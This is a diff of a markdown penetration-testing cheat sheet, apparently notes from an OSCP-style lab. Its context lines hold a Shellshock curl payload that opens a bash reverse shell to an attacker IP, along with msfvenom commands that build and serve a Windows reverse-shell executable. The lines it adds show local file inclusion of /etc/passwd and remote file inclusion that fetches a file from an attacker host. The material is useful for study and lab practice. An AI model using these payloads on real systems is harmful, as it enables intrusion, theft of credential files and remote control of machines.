@@ -230,6 +230,16 @@ OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vu
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.183/9001 0>&1'" \
 http://10.11.1.71:80/cgi-bin/admin.cgi
 ````
+### local File Inclusion
+````
+http://10.11.1.35/section.php?page=/etc/passwd
+````
+<img src="https://user-images.githubusercontent.com/127046919/227787857-bc760175-c5fb-47ce-986b-d15b8f59e555.png" width="350" height="270" />
+### Remote File Inclusion
+````
+http://10.11.1.35/section.php?page=http://192.168.119.168:80/hacker.txt
+````
+<img src="https://user-images.githubusercontent.com/127046919/227788184-6f4fed8d-9c8e-4107-bf63-ff2cbfe9b751.png" width="350" height="270" />
 
 ### Command Injection
 #### DNS Querying Service
@@ -240,8 +250,6 @@ For background the DNS Querying Service is running nslookup and then querying th
 
 <img src="https://user-images.githubusercontent.com/127046919/223560695-218399e2-2447-4b67-b93c-caee8e3ee3df.png" width="250" height="240" />
 
-### Command Injection RCE
-#### DNS Querying Service
 ````
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
 python3 -m http.server 80
